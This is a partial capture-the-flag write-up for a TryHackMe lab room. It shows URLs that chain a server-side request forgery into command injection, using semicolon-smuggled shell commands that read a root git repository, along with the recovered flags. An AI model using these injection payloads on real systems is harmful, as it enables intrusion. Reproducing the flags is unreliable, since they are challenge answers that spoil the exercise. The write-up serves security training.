# Room: [TheGreatEscape](https://tryhackme.com/room/thegreatescape)


:warning: Work in progress :warning:

## Basic enum:

the `robots.txt` gives us  http://10.10.204.152/exif-util/

=> http://escape.thm/exif-util.bak.txt ...

```bash
Fascinant! http://escape.thm/api/exif?url=http://api-dev-backup:8080/exif?url=

http://escape.thm/api/exif?url=http://api-dev-backup:8080/exif?url=curl%20--help

http://escape.thm/api/exif?url=http://api-dev-backup:8080/exif?url=curl%20--help;ls%20-lrtah

http://escape.thm/api/exif?url=http://api-dev-backup:8080/exif?url=curl%20--help;ls%20-larth%20/root/.git

http://escape.thm/api/exif?url=http://api-dev-backup:8080/exif?url=curl%20--help;git%20--git-dir%20/root/.git%20log

http://escape.thm/api/exif?url=http://api-dev-backup:8080/exif?url=curl%20--help;git%20--git-dir%20/root/.git%20show%20a3d30a7d0510dc6565ff9316e3fb84434916dee8
```
Ok so at least we have:

```bash
commit a3d30a7d0510dc6565ff9316e3fb84434916dee8
Author: Hydra <hydragyrum@example.com>
Date:   Wed Jan 6 20:51:39 2021 +0000

    Added the flag and dev notes

diff --git a/dev-note.txt b/dev-note.txt
new file mode 100644
index 0000000..89dcd01
--- /dev/null
+++ b/dev-note.txt
@@ -0,0 +1,9 @@
+Hey guys,
+
+I got tired of losing the ssh key all the time so I setup a way to open up the docker for remote admin.
+
+Just knock on ports 42, 1337, 10420, 6969, and 63000 to open the docker tcp port.
+
+Cheers,
+
+Hydra
\ No newline at end of file
diff --git a/flag.txt b/flag.txt
new file mode 100644
index 0000000..aae8129
--- /dev/null
+++ b/flag.txt
@@ -0,0 +1,3 @@
+You found the root flag, or did you?
+
+THM{0cb4b947[Redcated]b75a10876}
\ No newline at end of file
```

<details><summary>Click to reveal the root flag</summary>
<p>

    ```text
    THM{0cb4b947043cb5c0486a454b75a10876}
    ```
</p>
</details>

```bash
# cd .well-known
# ls
security.txt
# cat security.txt
Hey you found me!

The security.txt file is made to help security researchers and ethical hackers to contact the company about security issues.

See https://securitytxt.org/ for more information.

Ping /api/fl46 with a HEAD request for a nifty treat.
```

Ok fair enough :nerd_face:

```
root@X-X-X-X:~# curl -IXHEAD http://plop.thm/api/fl46
HTTP/1.1 200 OK
Server: nginx/1.19.6
Date: Sat, 17 Jul 2021 19:42:15 GMT
Connection: keep-alive
flag: THM{b801135[Redcated]a44c2e5ad4}
```

<details><summary>Click to reveal the root flag</summary>
<p>

    ```text
      THM{b801135794bf1ed3a2aafaa44c2e5ad4}
    ```
</p>
</details>
